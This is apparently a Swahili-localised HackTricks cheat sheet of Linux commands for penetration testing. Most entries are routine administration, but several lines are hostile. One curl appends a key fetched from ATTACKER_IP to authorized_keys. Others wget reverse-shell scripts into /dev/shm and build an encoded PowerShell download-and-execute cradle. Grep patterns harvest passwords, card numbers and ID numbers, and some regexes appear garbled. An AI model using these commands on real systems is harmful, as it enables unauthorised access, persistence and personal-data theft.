# Amri za Linux Zenye Manufaa

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Tumia [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kujenga na **kutumia taratibu za kiotomatiki** zinazotumia zana za jamii ya **kisasa zaidi** duniani.\
Pata Ufikiaji Leo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako inatangazwa kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi wa PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PR kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

## Bash ya Kawaida
```bash
#Exfiltration using Base64
base64 -w 0 file

#Get HexDump without new lines
xxd -p boot12.bin | tr -d '\n'

#Add public key to authorized keys
curl https://ATTACKER_IP/.ssh/id_rsa.pub >> ~/.ssh/authorized_keys

#Echo without new line and Hex
echo -n -e

#Count
wc -l <file> #Lines
wc -c #Chars

#Sort
sort -nr #Sort by number and then reverse
cat file | sort | uniq #Sort and delete duplicates

#Replace in file
sed -i 's/OLD/NEW/g' path/file #Replace string inside a file

#Download in RAM
wget 10.10.14.14:8000/tcp_pty_backconnect.py -O /dev/shm/.rev.py
wget 10.10.14.14:8000/tcp_pty_backconnect.py -P /dev/shm
curl 10.10.14.14:8000/shell.py -o /dev/shm/shell.py

#Files used by network processes
lsof #Open files belonging to any process
lsof -p 3 #Open files used by the process
lsof -i #Files used by networks processes
lsof -i 4 #Files used by network IPv4 processes
lsof -i 6 #Files used by network IPv6 processes
lsof -i 4 -a -p 1234 #List all open IPV4 network files in use by the process 1234
lsof +D /lib #Processes using files inside the indicated dir
lsof -i :80 #Files uses by networks processes
fuser -nv tcp 80

#Decompress
tar -xvzf /path/to/yourfile.tgz
tar -xvjf /path/to/yourfile.tbz
bzip2 -d /path/to/yourfile.bz2
tar jxf file.tar.bz2
gunzip /path/to/yourfile.gz
unzip file.zip
7z -x file.7z
sudo apt-get install xz-utils; unxz file.xz

#Add new user
useradd -p 'openssl passwd -1 <Password>' hacker

#Clipboard
xclip -sel c < cat file.txt

#HTTP servers
python -m SimpleHTTPServer 80
python3 -m http.server
ruby -rwebrick -e "WEBrick::HTTPServer.new(:Port => 80, :DocumentRoot => Dir.pwd).start"
php -S $ip:80

#Curl
#json data
curl --header "Content-Type: application/json" --request POST --data '{"password":"password", "username":"admin"}' http://host:3000/endpoint
#Auth via JWT
curl -X GET -H 'Authorization: Bearer <JWT>' http://host:3000/endpoint

#Send Email
sendEmail -t to@email.com -f from@email.com -s 192.168.8.131 -u Subject -a file.pdf #You will be prompted for the content

#DD copy hex bin file without first X (28) bytes
dd if=file.bin bs=28 skip=1 of=blob

#Mount .vhd files (virtual hard drive)
sudo apt-get install libguestfs-tools
guestmount --add NAME.vhd --inspector --ro /mnt/vhd #For read-only, create first /mnt/vhd

# ssh-keyscan, help to find if 2 ssh ports are from the same host comparing keys
ssh-keyscan 10.10.10.101

# Openssl
openssl s_client -connect 10.10.10.127:443 #Get the certificate from a server
openssl x509 -in ca.cert.pem -text #Read certificate
openssl genrsa -out newuser.key 2048 #Create new RSA2048 key
openssl req -new -key newuser.key -out newuser.csr #Generate certificate from a private key. Recommended to set the "Organizatoin Name"(Fortune) and the "Common Name" (newuser@fortune.htb)
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes #Create certificate
openssl x509 -req -in newuser.csr -CA intermediate.cert.pem -CAkey intermediate.key.pem -CAcreateserial -out newuser.pem -days 1024 -sha256 #Create a signed certificate
openssl pkcs12 -export -out newuser.pfx -inkey newuser.key -in newuser.pem #Create from the signed certificate the pkcs12 certificate format (firefox)
# If you only needs to create a client certificate from a Ca certificate and the CA key, you can do it using:
openssl pkcs12 -export -in ca.cert.pem -inkey ca.key.pem -out client.p12
# Decrypt ssh key
openssl rsa -in key.ssh.enc -out key.ssh
#Decrypt
openssl enc -aes256 -k <KEY> -d -in backup.tgz.enc -out b.tgz

#Count number of instructions executed by a program, need a host based linux (not working in VM)
perf stat -x, -e instructions:u "ls"

#Find trick for HTB, find files from 2018-12-12 to 2018-12-14
find / -newermt 2018-12-12 ! -newermt 2018-12-14 -type f -readable -not -path "/proc/*" -not -path "/sys/*" -ls 2>/dev/null

#Reconfigure timezone
sudo dpkg-reconfigure tzdata

#Search from which package is a binary
apt-file search /usr/bin/file #Needed: apt-get install apt-file

#Protobuf decode https://www.ezequiel.tech/2020/08/leaking-google-cloud-projects.html
echo "CIKUmMesGw==" | base64 -d | protoc --decode_raw

#Set not removable bit
sudo chattr +i file.txt
sudo chattr -i file.txt #Remove the bit so you can delete it

# List files inside zip
7z l file.zip
```
<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Tumia [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kujenga na **kutumia taratibu za kiotomatiki** zinazotumia zana za jamii zilizo **za juu zaidi** duniani.\
Pata Ufikiaji Leo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Bash kwa Windows
```bash
#Base64 for Windows
echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/9002.ps1')" | iconv --to-code UTF-16LE | base64 -w0

#Exe compression
upx -9 nc.exe

#Exe2bat
wine exe2bat.exe nc.exe nc.txt

#Compile Windows python exploit to exe
pip install pyinstaller
wget -O exploit.py http://www.exploit-db.com/download/31853
python pyinstaller.py --onefile exploit.py

#Compile for windows
#sudo apt-get install gcc-mingw-w64-i686
i686-mingw32msvc-gcc -o executable useradd.c
```
## Greps

### Description
The `grep` command is a powerful tool used to search for specific patterns or strings within files. It is commonly used in Linux systems for various purposes, such as finding specific lines in log files, searching for keywords in source code, or filtering output from other commands.

### Syntax
The basic syntax of the `grep` command is as follows:

```
grep [options] pattern [file...]
```

- `options`: Optional flags that modify the behavior of the command.
- `pattern`: The pattern or string to search for.
- `file`: Optional file(s) to search within. If no file is specified, `grep` will read from standard input.

### Examples
Here are some examples of how the `grep` command can be used:

1. Search for a specific string in a file:
```
grep "example" file.txt
```

2. Search for a pattern in multiple files:
```
grep "pattern" file1.txt file2.txt file3.txt
```

3. Search for a pattern in all files within a directory:
```
grep "pattern" /path/to/directory/*
```

4. Search for a pattern recursively in all files within a directory:
```
grep -r "pattern" /path/to/directory/
```

5. Search for a pattern and display the line number:
```
grep -n "pattern" file.txt
```

6. Search for a pattern and ignore case sensitivity:
```
grep -i "pattern" file.txt
```

### Conclusion
The `grep` command is a versatile tool for searching and filtering text in Linux systems. By understanding its syntax and options, you can effectively use it to find specific patterns or strings within files.
```bash
#Extract emails from file
grep -E -o "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b" file.txt

#Extract valid IP addresses
grep -E -o "(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)" file.txt

#Extract passwords
grep -i "pwd\|passw" file.txt

#Extract users
grep -i "user\|invalid\|authentication\|login" file.txt

# Extract hashes
#Extract md5 hashes ({32}), sha1 ({40}), sha256({64}), sha512({128})
egrep -oE '(^|[^a-fA-F0-9])[a-fA-F0-9]{32}([^a-fA-F0-9]|$)' *.txt | egrep -o '[a-fA-F0-9]{32}' > md5-hashes.txt
#Extract valid MySQL-Old hashes
grep -e "[0-7][0-9a-f]{7}[0-7][0-9a-f]{7}" *.txt > mysql-old-hashes.txt
#Extract blowfish hashes
grep -e "$2a\$\08\$(.){75}" *.txt > blowfish-hashes.txt
#Extract Joomla hashes
egrep -o "([0-9a-zA-Z]{32}):(w{16,32})" *.txt > joomla.txt
#Extract VBulletin hashes
egrep -o "([0-9a-zA-Z]{32}):(S{3,32})" *.txt > vbulletin.txt
#Extraxt phpBB3-MD5
egrep -o '$H$S{31}' *.txt > phpBB3-md5.txt
#Extract Wordpress-MD5
egrep -o '$P$S{31}' *.txt > wordpress-md5.txt
#Extract Drupal 7
egrep -o '$S$S{52}' *.txt > drupal-7.txt
#Extract old Unix-md5
egrep -o '$1$w{8}S{22}' *.txt > md5-unix-old.txt
#Extract md5-apr1
egrep -o '$apr1$w{8}S{22}' *.txt > md5-apr1.txt
#Extract sha512crypt, SHA512(Unix)
egrep -o '$6$w{8}S{86}' *.txt > sha512crypt.txt

#Extract e-mails from text files
grep -E -o "\b[a-zA-Z0-9.#?$*_-]+@[a-zA-Z0-9.#?$*_-]+.[a-zA-Z0-9.-]+\b" *.txt > e-mails.txt

#Extract HTTP URLs from text files
grep http | grep -shoP 'http.*?[" >]' *.txt > http-urls.txt
#For extracting HTTPS, FTP and other URL format use
grep -E '(((https|ftp|gopher)|mailto)[.:][^ >"	]*|www.[-a-z0-9.]+)[^ .,;	>">):]' *.txt > urls.txt
#Note: if grep returns "Binary file (standard input) matches" use the following approaches # tr '[\000-\011\013-\037177-377]' '.' < *.log | grep -E "Your_Regex" OR # cat -v *.log | egrep -o "Your_Regex"

#Extract Floating point numbers
grep -E -o "^[-+]?[0-9]*.?[0-9]+([eE][-+]?[0-9]+)?$" *.txt > floats.txt

# Extract credit card data
#Visa
grep -E -o "4[0-9]{3}[ -]?[0-9]{4}[ -]?[0-9]{4}[ -]?[0-9]{4}" *.txt > visa.txt
#MasterCard
grep -E -o "5[0-9]{3}[ -]?[0-9]{4}[ -]?[0-9]{4}[ -]?[0-9]{4}" *.txt > mastercard.txt
#American Express
grep -E -o "\b3[47][0-9]{13}\b" *.txt > american-express.txt
#Diners Club
grep -E -o "\b3(?:0[0-5]|[68][0-9])[0-9]{11}\b" *.txt > diners.txt
#Discover
grep -E -o "6011[ -]?[0-9]{4}[ -]?[0-9]{4}[ -]?[0-9]{4}" *.txt > discover.txt
#JCB
grep -E -o "\b(?:2131|1800|35d{3})d{11}\b" *.txt > jcb.txt
#AMEX
grep -E -o "3[47][0-9]{2}[ -]?[0-9]{6}[ -]?[0-9]{5}" *.txt > amex.txt

# Extract IDs
#Extract Social Security Number (SSN)
grep -E -o "[0-9]{3}[ -]?[0-9]{2}[ -]?[0-9]{4}" *.txt > ssn.txt
#Extract Indiana Driver License Number
grep -E -o "[0-9]{4}[ -]?[0-9]{2}[ -]?[0-9]{4}" *.txt > indiana-dln.txt
#Extract US Passport Cards
grep -E -o "C0[0-9]{7}" *.txt > us-pass-card.txt
#Extract US Passport Number
grep -E -o "[23][0-9]{8}" *.txt > us-pass-num.txt
#Extract US Phone Numberss
grep -Po 'd{3}[s-_]?d{3}[s-_]?d{4}' *.txt > us-phones.txt
#Extract ISBN Numbers
egrep -a -o "\bISBN(?:-1[03])?:? (?=[0-9X]{10}$|(?=(?:[0-9]+[- ]){3})[- 0-9X]{13}$|97[89][0-9]{10}$|(?=(?:[0-9]+[- ]){4})[- 0-9]{17}$)(?:97[89][- ]?)?[0-9]{1,5}[- ]?[0-9]+[- ]?[0-9]+[- ]?[0-9X]\b" *.txt > isbn.txt
```
## Tafuta

To find files or directories in Linux, you can use the `find` command. This command allows you to search for files based on various criteria such as name, size, type, and more.

### Syntax

The basic syntax of the `find` command is as follows:

```
find [path] [expression]
```

- `[path]`: Specifies the directory or path where the search should start. If no path is specified, the search will start from the current directory.
- `[expression]`: Specifies the search criteria or conditions.

### Examples

Here are some examples of how to use the `find` command:

1. Find all files in the current directory:

   ```
   find .
   ```

2. Find all directories in the `/var` directory:

   ```
   find /var -type d
   ```

3. Find all files with a specific extension (e.g., `.txt`) in the current directory:

   ```
   find . -name "*.txt"
   ```

4. Find all files larger than a specific size (e.g., 1MB) in the current directory:

   ```
   find . -size +1M
   ```

5. Find all files modified within the last 7 days in the current directory:

   ```
   find . -mtime -7
   ```

6. Find all files owned by a specific user (e.g., `john`) in the current directory:

   ```
   find . -user john
   ```

These are just a few examples of how you can use the `find` command to search for files and directories in Linux. The `find` command is a powerful tool that can be customized to meet your specific search requirements.
```bash
# Find SUID set files.
find / -perm /u=s -ls 2>/dev/null

# Find SGID set files.
find / -perm /g=s -ls 2>/dev/null

# Found Readable directory and sort by time.  (depth = 4)
find / -type d -maxdepth 4 -readable -printf "%T@ %Tc | %p \n" 2>/dev/null | grep -v "| /proc" | grep -v "| /dev" | grep -v "| /run" | grep -v "| /var/log" | grep -v "| /boot"  | grep -v "| /sys/" | sort -n -r

# Found Writable directory and sort by time.  (depth = 10)
find / -type d -maxdepth 10 -writable -printf "%T@ %Tc | %p \n" 2>/dev/null | grep -v "| /proc" | grep -v "| /dev" | grep -v "| /run" | grep -v "| /var/log" | grep -v "| /boot"  | grep -v "| /sys/" | sort -n -r

# Or Found Own by Current User and sort by time. (depth = 10)
find / -maxdepth 10 -user $(id -u) -printf "%T@ %Tc | %p \n" 2>/dev/null | grep -v "| /proc" | grep -v "| /dev" | grep -v "| /run" | grep -v "| /var/log" | grep -v "| /boot"  | grep -v "| /sys/" | sort -n -r

# Or Found Own by Current Group ID and Sort by time. (depth = 10)
find / -maxdepth 10 -group $(id -g) -printf "%T@ %Tc | %p \n" 2>/dev/null | grep -v "| /proc" | grep -v "| /dev" | grep -v "| /run" | grep -v "| /var/log" | grep -v "| /boot"  | grep -v "| /sys/" | sort -n -r

# Found Newer files and sort by time. (depth = 5)
find / -maxdepth 5 -printf "%T@ %Tc | %p \n" 2>/dev/null | grep -v "| /proc" | grep -v "| /dev" | grep -v "| /run" | grep -v "| /var/log" | grep -v "| /boot"  | grep -v "| /sys/" | sort -n -r | less

# Found Newer files only and sort by time. (depth = 5)
find / -maxdepth 5 -type f -printf "%T@ %Tc | %p \n" 2>/dev/null | grep -v "| /proc" | grep -v "| /dev" | grep -v "| /run" | grep -v "| /var/log" | grep -v "| /boot"  | grep -v "| /sys/" | sort -n -r | less

# Found Newer directory only and sort by time. (depth = 5)
find / -maxdepth 5 -type d -printf "%T@ %Tc | %p \n" 2>/dev/null | grep -v "| /proc" | grep -v "| /dev" | grep -v "| /run" | grep -v "| /var/log" | grep -v "| /boot"  | grep -v "| /sys/" | sort -n -r | less
```
## Msaada wa Kutafuta kwa Nmap

Nmap ni chombo maarufu cha uchunguzi wa usalama kinachotumiwa na wataalamu wa usalama wa mtandao. Inaweza kutumiwa kutafuta na kuchunguza vifaa na huduma zinazopatikana kwenye mtandao. Hapa kuna baadhi ya mifano ya amri za kutafuta na kuchunguza na Nmap:

- **Tafuta vifaa kwenye mtandao**: Unaweza kutumia amri `nmap -sn <anwani ya mtandao>` kutafuta vifaa vilivyowashwa kwenye mtandao fulani. Kwa mfano, `nmap -sn 192.168.0.0/24` itatafuta vifaa vilivyowashwa kwenye mtandao wa 192.168.0.0/24.

- **Tafuta huduma zinazopatikana**: Unaweza kutumia amri `nmap -p <namba ya bandari> <anwani ya mtandao>` kutafuta huduma zinazopatikana kwenye bandari fulani kwenye mtandao. Kwa mfano, `nmap -p 80 192.168.0.1` itatafuta ikiwa kuna huduma inayopatikana kwenye bandari ya 80 kwenye anwani ya mtandao 192.168.0.1.

- **Tafuta maelezo ya kina**: Unaweza kutumia amri `nmap -A <anwani ya mtandao>` kutafuta maelezo ya kina kuhusu vifaa na huduma zinazopatikana kwenye mtandao. Kwa mfano, `nmap -A 192.168.0.1` itatoa maelezo ya kina kuhusu vifaa na huduma zinazopatikana kwenye anwani ya mtandao 192.168.0.1.

- **Tafuta vifaa vilivyofungwa**: Unaweza kutumia amri `nmap -Pn <anwani ya mtandao>` kutafuta vifaa vilivyofungwa kwenye mtandao. Kwa mfano, `nmap -Pn 192.168.0.0/24` itatafuta vifaa vilivyofungwa kwenye mtandao wa 192.168.0.0/24.

- **Tafuta vifaa kwa kutumia faili**: Unaweza kutumia amri `nmap -iL <njia ya faili>` kutafuta vifaa kwa kutumia orodha ya anwani za mtandao zilizoorodheshwa kwenye faili. Kwa mfano, `nmap -iL /path/to/file.txt` itatafuta vifaa kwa kutumia anwani za mtandao zilizoorodheshwa kwenye faili ya /path/to/file.txt.

Hizi ni baadhi tu ya amri za kutafuta na kuchunguza na Nmap. Kuna amri nyingine nyingi zinazopatikana ambazo zinaweza kutumiwa kulingana na mahitaji yako. Unaweza kujifunza zaidi kuhusu amri hizi na uwezo wa Nmap kwa kusoma nyaraka rasmi za Nmap.
```bash
#Nmap scripts ((default or version) and smb))
nmap --script-help "(default or version) and *smb*"
locate -r '\.nse$' | xargs grep categories | grep 'default\|version\|safe' | grep smb
nmap --script-help "(default or version) and smb)"
```
## Bash

Bash ni lugha ya programu ya Unix shell ambayo inatumika sana katika mifumo ya Linux. Inatoa njia rahisi ya kuingiliana na mfumo wa uendeshaji na kutekeleza amri za shell.

### Amri za Msingi

- `ls`: Onyesha orodha ya faili na folda katika saraka ya sasa.
- `cd`: Badilisha saraka ya sasa.
- `pwd`: Onyesha saraka ya sasa.
- `mkdir`: Unda saraka mpya.
- `rm`: Futa faili au saraka.
- `cp`: Nakili faili au saraka.
- `mv`: Hamisha faili au saraka.
- `cat`: Onyesha maudhui ya faili.
- `grep`: Tafuta maneno katika faili.
- `chmod`: Badilisha ruhusa za faili au saraka.
- `chown`: Badilisha mmiliki wa faili au saraka.
- `ssh`: Ingia kwa mbali kwenye seva.

### Amri za Mtandao

- `ping`: Tuma ping kwa anwani ya IP ili kuthibitisha uhusiano.
- `ifconfig`: Onyesha maelezo ya kadi ya mtandao.
- `netstat`: Onyesha hali ya mtandao na uhusiano.
- `wget`: Pakua faili kutoka kwenye mtandao.
- `curl`: Pata au tuma data kwa kutumia itifaki za mtandao.

### Amri za Usalama

- `passwd`: Badilisha nenosiri la mtumiaji.
- `sudo`: Tekeleza amri kama mtumiaji mwingine au superuser.
- `su`: Ingia kama mtumiaji mwingine.
- `chroot`: Unda mazingira ya kizimbani.
- `iptables`: Usimamizi wa firewall.
- `ufw`: Usimamizi wa firewall rahisi.
- `fail2ban`: Kinga dhidi ya mashambulizi ya brute force.

### Amri za Utafiti

- `ps`: Onyesha mchakato unaofanya kazi.
- `top`: Onyesha mchakato unaotumia rasilimali nyingi.
- `du`: Onyesha matumizi ya diski ya folda.
- `df`: Onyesha nafasi ya diski iliyobaki.
- `find`: Tafuta faili na folda kulingana na vigezo.
- `grep`: Tafuta maneno katika faili.
- `locate`: Tafuta faili kwa jina.

### Amri za Usimamizi wa Pakiti

- `apt-get`: Usimamizi wa pakiti kwa mfumo wa Debian.
- `yum`: Usimamizi wa pakiti kwa mfumo wa Red Hat.
- `dnf`: Usimamizi wa pakiti kwa mfumo wa Fedora.
- `pacman`: Usimamizi wa pakiti kwa mfumo wa Arch Linux.

### Amri za Ufuatiliaji wa Mfumo

- `htop`: Onyesha mchakato unaotumia rasilimali nyingi kwa njia ya kuvutia zaidi.
- `iotop`: Onyesha matumizi ya diski kwa mchakato.
- `nethogs`: Onyesha matumizi ya mtandao kwa mchakato.
- `strace`: Fuatilia wito wa mfumo na shughuli za faili.
- `lsof`: Onyesha faili zinazotumiwa na mchakato.

### Amri za Kujenga Skripti

- `echo`: Onyesha ujumbe kwenye skrini.
- `read`: Soma kuingizo kutoka kwa mtumiaji.
- `if`: Tengeneza uamuzi wa masharti.
- `for`: Rudia amri kwa idadi fulani ya mara.
- `while`: Rudia amri mpaka hali fulani itimize.
- `case`: Tengeneza uamuzi wa masharti na chaguzi nyingi.

### Amri za Kusaidia

- `man`: Onyesha maelezo ya amri.
- `help`: Onyesha maelezo ya amri ya ndani ya Bash.
- `info`: Onyesha maelezo ya amri kwa muundo wa Info.
- `whatis`: Onyesha maelezo mafupi ya amri.
```bash
#All bytes inside a file (except 0x20 and 0x00)
for j in $((for i in {0..9}{0..9} {0..9}{a..f} {a..f}{0..9} {a..f}{a..f}; do echo $i; done ) | sort | grep -v "20\|00"); do echo -n -e "\x$j" >> bytes; done
```
## Iptables

Iptables ni chombo cha usimamizi wa firewall kinachopatikana kwenye mifumo mingi ya Linux. Inaruhusu udhibiti wa trafiki ya mtandao kwa kuzuia au kuruhusu pakiti za mtandao kulingana na seti ya sheria zilizowekwa.

### Kuanzisha Iptables

Kabla ya kuanza kutumia Iptables, ni muhimu kuhakikisha kuwa moduli ya kernel ya iptables imeamilishwa. Unaweza kuthibitisha hili kwa kuchunguza ikiwa faili ya `/proc/net/ip_tables_matches` ipo.

### Kutumia Iptables

Iptables inatumia mnyororo wa sheria (chain) kusimamia trafiki ya mtandao. Kuna mnyororo wa sheria tatu muhimu:

- **INPUT**: Inadhibiti pakiti zinazoingia kwenye mfumo.
- **FORWARD**: Inadhibiti pakiti zinazopitia mfumo.
- **OUTPUT**: Inadhibiti pakiti zinazotoka kwenye mfumo.

Kila mnyororo wa sheria una seti ya sheria ambazo zinaweza kuwa na hatua tofauti kama vile kukubali (ACCEPT), kukataa (DROP), au kuelekeza (REDIRECT) pakiti.

### Mifano ya Matumizi

Hapa kuna mifano michache ya matumizi ya Iptables:

- **Kuzuia trafiki ya SSH**: Unaweza kuzuia trafiki ya SSH kwa kuzuia pakiti zinazoingia kwenye bandari ya SSH (kawaida bandari 22). Hii inazuia upatikanaji wa mbali kwenye mfumo wako kupitia SSH.

```bash
iptables -A INPUT -p tcp --dport 22 -j DROP
```

- **Kuruhusu trafiki ya HTTP**: Unaweza kuruhusu trafiki ya HTTP kwa kuruhusu pakiti zinazoingia kwenye bandari ya HTTP (kawaida bandari 80).

```bash
iptables -A INPUT -p tcp --dport 80 -j ACCEPT
```

- **Kuzuia trafiki kutoka kwa anwani ya IP**: Unaweza kuzuia trafiki kutoka kwa anwani ya IP fulani kwa kuzuia pakiti zinazoingia kutoka anwani hiyo.

```bash
iptables -A INPUT -s 192.168.0.100 -j DROP
```

### Kuhifadhi Mipangilio ya Iptables

Mipangilio ya Iptables inaweza kuhifadhiwa kwa kutumia amri ya `iptables-save`. Hii itaunda faili ya konfigurisheni ambayo inaweza kurejeshwa kwa kutumia amri ya `iptables-restore`.

```bash
iptables-save > /path/to/iptables-rules
```

### Hitimisho

Iptables ni chombo muhimu cha usimamizi wa firewall kinachopatikana kwenye mifumo mingi ya Linux. Kwa kuelewa jinsi ya kutumia Iptables, unaweza kudhibiti trafiki ya mtandao kwenye mfumo wako na kuongeza usalama.
```bash
#Delete curent rules and chains
iptables --flush
iptables --delete-chain

#allow loopback
iptables -A INPUT -i lo -j ACCEPT
iptables -A OUTPUT -o lo -j ACCEPT

#drop ICMP
iptables -A INPUT -p icmp -m icmp --icmp-type any -j DROP
iptables -A OUTPUT -p icmp -j DROP

#allow established connections
iptables -A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT

#allow ssh, http, https, dns
iptables -A INPUT -s 10.10.10.10/24 -p tcp -m tcp --dport 22 -j ACCEPT
iptables -A INPUT -p tcp -m state --state NEW -m tcp --dport 80 -j ACCEPT
iptables -A INPUT -p tcp -m state --state NEW -m tcp --dport 443 -j ACCEPT
iptables -A INPUT -p udp -m udp --sport 53 -j ACCEPT
iptables -A INPUT -p tcp -m tcp --sport 53 -j ACCEPT
iptables -A OUTPUT -p udp -m udp --dport 53 -j ACCEPT
iptables -A OUTPUT -p tcp -m tcp --dport 53 -j ACCEPT

#default policies
iptables -P INPUT DROP
iptables -P FORWARD ACCEPT
iptables -P OUTPUT ACCEPT
```
<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikionekana kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa kipekee wa [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwenye** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Tumia [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kujenga na **kuautomatisha mchakato** wa kazi zako kwa kutumia zana za jamii zilizo **za juu zaidi** duniani.\
Pata Ufikiaji Leo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
